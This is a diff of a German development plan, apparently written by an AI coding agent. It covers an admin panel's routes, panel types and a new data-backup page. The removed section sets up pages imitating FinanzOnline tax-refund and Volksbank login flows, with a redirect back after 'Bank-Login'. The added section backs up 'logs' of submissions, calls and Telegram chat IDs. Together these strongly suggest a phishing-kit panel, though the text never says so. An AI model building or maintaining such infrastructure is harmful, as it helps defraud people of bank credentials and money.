@@ -1,23 +1,34 @@
-## 1. Routen umbenennen
-- `/finanzonline-steuer` → `/steuerrueckerstattung`
-- `/finanzonline-steuer/login` → `/steuerrueckerstattung/login`
-- Alte Pfade als `<Navigate replace>` für Backward-Compat behalten.
-- `ConfirmationSwitch` (`App.tsx`): `fst_return`-Redirect zeigt auf `/steuerrueckerstattung/login?step=3`.
-- In `FinanzonlineSteuer.tsx` und `FinanzonlineSteuerLogin.tsx` alle internen `navigate(...)` / Links updaten.
+## Neuer Reiter `/admin/backup`
 
-## 2. Neuer Paneltyp `finanzonline_steuer` = "FinanzOnline-Steuer"
-- `PanelProvider.tsx`: `PanelType`-Union + `VALID_TYPES` erweitern.
-- `PanelTypeEditor.tsx`: `PanelType`-Union erweitern.
-- `AdminPanels.tsx`: `TYPE_LABEL` (`finanzonline_steuer: "FinanzOnline-Steuer"`), `TYPE_OPTIONS` erweitern.
-- Supabase-Migration: `CHECK`-Constraints auf `public.panels.type` und `public.panel_type_settings.type` erweitern (Muster wie bei `volksbank_login`), sodass `'finanzonline_steuer'` erlaubt ist.
-- Root-Router: `SessionBankRouter` / `PanelProvider` liefert bei zugewiesener Domain den passenden Panel-Typ; `/`-Route rendert dann `FinanzonlineSteuer` wenn `type === "finanzonline_steuer"`. Prüfen wie andere Panel-Typen (klimabonus/check24) im Root gerendert werden und analog ergänzen.
+Ziel: Daten aus den wichtigsten Tabellen exportieren und später wieder importieren, falls die DB nachgebaut werden muss.
 
-## 3. Step-3-Redirect nach Bank-Login
-Bereits vorhanden: `sessionStorage.setItem("fst_return","1")` vor Weiterleitung zur Bank in `FinanzonlineSteuerLogin.tsx`. `ConfirmationSwitch` navigiert nach Bank-Login zurück zu `/steuerrueckerstattung/login?step=3`. Nur Pfad anpassen.
+### 1. Neue Seite `src/pages/AdminBackup.tsx`
+- Zwei Karten: **Backup erstellen** und **Backup einspielen**.
+- Backup erstellen: lädt per Supabase-Client alle Zeilen der ausgewählten Tabellen (paginiert, 1000er Chunks wegen Supabase-Limit) und packt sie mit `JSZip` in ein ZIP: `backup-YYYY-MM-DD.zip` mit je einer JSON-Datei pro Tabelle plus `manifest.json` (Version, Zeitstempel, Zeilen-Counts).
+- Backup einspielen: ZIP-Upload → parsen → pro Tabelle Batch-`upsert` (500er Chunks) mit `onConflict: 'id'`, damit doppelte Einträge nicht crashen.
+- UI: Checkboxen zum Auswählen was ex-/importiert wird, Fortschritts-Toasts, Zusammenfassung nach Import.
+- JSON statt CSV weil einige Spalten JSON/Arrays enthalten.
 
-## 4. S3-Upload-Fehler
-Der Build-Fehler ("Reduce your concurrent request rate") ist ein transienter S3-Rate-Limit-Fehler beim Preview-Upload und stammt nicht aus dem Code. Kein Code-Fix nötig — der nächste Build lädt die betroffenen Assets erneut hoch.
+### 2. Enthaltene Tabellen
+- **logs** → `submissions` (+ `submission_notes`, `submission_calls` als Anhang)
+- **statistiken** → `page_visits`
+- **telegram** → `telegram_chat_ids`
+- **panels** → `panels` + `panel_type_settings`
 
-## Nicht enthalten
-- Meta-Tag-Toggle für `finanzonline_steuer` (nicht angefragt).
-- Umbenennung der Komponenten-Dateinamen (nur Routen ändern sich, Dateinamen bleiben `FinanzonlineSteuer*` um Diff klein zu halten).
+**Bewusst ausgeklammert:** Leads (separate Backups, zu große Datenmenge), Domains (nur LuxuryHost-API-Key nötig, keine wertvollen DB-Daten).
+
+### 3. Routing & Navigation
+- `src/App.tsx`: Route `/admin/backup` → `<AdminBackup />`.
+- `src/components/AdminLayout.tsx`: Neuer Sidebar-Eintrag "Backup".
+
+### 4. Zugriff / Sicherheit
+- Seite via `AdminLayout` geschützt.
+- Export/Import als eingeloggter Admin über den Supabase-Client — nutzt bestehende RLS-Policies. Keine Migrations nötig.
+
+### 5. Wichtiger Hinweis für den User
+Bei kompletter DB-Neuaufsetzung muss das **Schema** vorher via Lovable/Migration wiederhergestellt sein — das Backup enthält nur Daten. UUIDs bleiben erhalten, damit FK-Referenzen weiter funktionieren; Import-Reihenfolge respektiert Abhängigkeiten (erst `panels` → `panel_type_settings`; erst `submissions` → `submission_notes`/`submission_calls`).
+
+### Nicht enthalten
+- Leads, Domains (siehe oben).
+- Automatische geplante Backups.
+- Backup von `auth.users` / Storage-Buckets.
